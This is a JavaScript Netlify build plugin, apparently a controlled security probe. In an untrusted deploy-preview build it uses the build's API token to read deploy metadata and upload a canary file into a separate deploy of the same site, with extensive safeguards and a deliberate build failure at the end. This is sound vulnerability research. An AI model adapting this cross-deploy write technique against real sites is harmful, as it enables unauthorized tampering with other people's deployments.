import { createHash } from 'node:crypto'

const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
const EXPECTED_API_ORIGIN = 'https://api.netlify.com'
const TARGET_DEPLOY_ID = '6abdc5cf28bb578d156715eb'
const TARGET_BRANCH = 'controlled-binding-target-20260930'
const TARGET_PATH = 'binding-canary.txt'
const TARGET_BYTES = Buffer.from('netlify-cross-deploy-binding-20260930\n')
const TARGET_SHA1 = '4426388dadb1fd9afd6cd6262c8ca7b113336ab9'

const normalizeApiBase = (value) =>
  /^https?:\/\//i.test(value || '') ? value : `https://${value || 'api.netlify.com'}`

const readSitePolicy = async ({ apiBase, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      untrustedFlow: body?.build_settings?.untrusted_flow || null,
      publicRepo: body?.build_settings?.public_repo === true,
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const readDeploy = async ({ apiBase, deployId, token }) => {
  try {
    const response = await fetch(new URL(`/api/v1/deploys/${deployId}`, apiBase), {
      headers: { authorization: `Bearer ${token}` },
      redirect: 'error',
      signal: AbortSignal.timeout(10_000),
    })
    const body = response.ok ? await response.json() : null
    return {
      status: response.status,
      ok: response.ok,
      deployIdMatches: body?.id === deployId,
      siteIdMatches: body?.site_id === EXPECTED_SITE_ID,
      context: ['deploy-preview', 'branch-deploy', 'production'].includes(body?.context)
        ? body.context
        : null,
      branch: typeof body?.branch === 'string' ? body.branch : null,
      reviewId: body?.review_id == null ? null : String(body.review_id),
      commitRef: /^[0-9a-f]{40}$/.test(body?.commit_ref || '') ? body.commit_ref : null,
      state: [
        'new',
        'enqueued',
        'building',
        'uploading',
        'uploaded',
        'preparing',
        'prepared',
        'processing',
        'processed',
        'ready',
        'error',
      ].includes(body?.state)
        ? body.state
        : null,
      published: body?.published_at != null,
      responseBodyRetained: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRetained: false,
    }
  }
}

const uploadTargetFile = async ({ apiBase, token }) => {
  try {
    const encodedPath = TARGET_PATH.split('/').map(encodeURIComponent).join('/')
    const expectedPathname = `/api/v1/deploys/${TARGET_DEPLOY_ID}/files/${encodedPath}`
    const url = new URL(expectedPathname, apiBase)
    if (url.pathname !== expectedPathname || decodeURIComponent(encodedPath) !== TARGET_PATH) {
      throw new Error('Target upload path did not round-trip')
    }
    url.searchParams.set('size', String(TARGET_BYTES.length))
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/octet-stream',
      },
      body: TARGET_BYTES,
      redirect: 'error',
      signal: AbortSignal.timeout(20_000),
    })
    await response.body?.cancel()
    return {
      status: response.status,
      ok: response.ok,
      responseBodyRead: false,
    }
  } catch (error) {
    return {
      requestFailed: true,
      errorClass: error?.constructor?.name || 'Error',
      responseBodyRead: false,
    }
  }
}

export const onPostBuild = async ({ constants, utils }) => {
  const currentDeployId = process.env.DEPLOY_ID || ''
  const currentCommitRef = process.env.COMMIT_REF || ''
  const token = constants.NETLIFY_API_TOKEN
  const apiBase = normalizeApiBase(constants.NETLIFY_API_HOST)
  let apiEndpointTrusted = false
  try {
    const parsedApiBase = new URL(apiBase)
    apiEndpointTrusted =
      parsedApiBase.origin === EXPECTED_API_ORIGIN &&
      parsedApiBase.pathname === '/' &&
      parsedApiBase.search === '' &&
      parsedApiBase.hash === '' &&
      parsedApiBase.username === '' &&
      parsedApiBase.password === ''
  } catch {}

  const tokenPresent = typeof token === 'string' && token.length > 0
  const canRead = apiEndpointTrusted && tokenPresent
  const policy = canRead ? await readSitePolicy({ apiBase, token }) : null
  const currentDeploy =
    canRead && /^[0-9a-f]{24}$/.test(currentDeployId)
      ? await readDeploy({ apiBase, deployId: currentDeployId, token })
      : null
  const targetBefore = canRead
    ? await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
    : null
  const targetReadSafe =
    targetBefore?.status === 401 ||
    targetBefore?.status === 403 ||
    targetBefore?.status === 404 ||
    (targetBefore?.status === 200 &&
      targetBefore?.deployIdMatches === true &&
      targetBefore?.siteIdMatches === true &&
      targetBefore?.context === 'deploy-preview' &&
      targetBefore?.branch === TARGET_BRANCH &&
      targetBefore?.published === false &&
      ['uploading', 'uploaded', 'preparing', 'prepared'].includes(targetBefore?.state))
  const prerequisites = {
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    controlledReview: process.env.REVIEW_ID === '1',
    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
    buildbotMode: constants.IS_LOCAL === false,
    trustedApiEndpoint: apiEndpointTrusted,
    policyReadSucceeded: policy?.status === 200,
    redactedPolicy: policy?.untrustedFlow === 'redact',
    publicRepository: policy?.publicRepo === true,
    currentDeployIdPresent: /^[0-9a-f]{24}$/.test(currentDeployId),
    currentCommitRefPresent: /^[0-9a-f]{40}$/.test(currentCommitRef),
    currentDeployBindingExact:
      currentDeploy?.status === 200 &&
      currentDeploy?.deployIdMatches === true &&
      currentDeploy?.siteIdMatches === true &&
      currentDeploy?.context === 'deploy-preview' &&
      currentDeploy?.branch === EXPECTED_BRANCH &&
      currentDeploy?.reviewId === '1' &&
      currentDeploy?.commitRef === currentCommitRef &&
      currentDeploy?.state === 'building' &&
      currentDeploy?.published === false,
    targetDeployIdExact: TARGET_DEPLOY_ID === '6abdc5cf28bb578d156715eb',
    targetDistinctFromCurrent: TARGET_DEPLOY_ID !== currentDeployId,
    targetReadSafe,
    tokenPresent,
    targetBytesPinned:
      TARGET_BYTES.length === 38 &&
      createHash('sha1').update(TARGET_BYTES).digest('hex') === TARGET_SHA1,
  }
  const result = {
    schema: 'netlify-untrusted-same-site-cross-deploy-static-upload.v1',
    prerequisites,
    policy,
    currentDeploy,
    targetBefore,
    attempted: false,
    upload: null,
    targetAfter: null,
    controlledFailureRequested: false,
    targetSiteOwned: true,
    targetDeployCreatedForProbe: true,
    productionTargeted: false,
    credentialValuesLogged: false,
    digestValuesLogged: false,
    responseBodiesRetained: false,
    syntheticOnly: true,
  }

  if (!Object.values(prerequisites).every(Boolean)) {
    console.log(`NETLIFY_UNTRUSTED_CROSS_DEPLOY_BINDING ${JSON.stringify(result)}`)
    utils.build.failBuild('Controlled cross-deploy probe prerequisites were not satisfied')
    return
  }

  result.attempted = true
  result.upload = await uploadTargetFile({ apiBase, token })
  await new Promise((resolveWait) => setTimeout(resolveWait, 1_000))
  result.targetAfter = await readDeploy({ apiBase, deployId: TARGET_DEPLOY_ID, token })
  result.controlledFailureRequested = true
  console.log(`NETLIFY_UNTRUSTED_CROSS_DEPLOY_BINDING ${JSON.stringify(result)}`)
  utils.build.failBuild('Controlled failure after same-site cross-deploy upload probe')
}
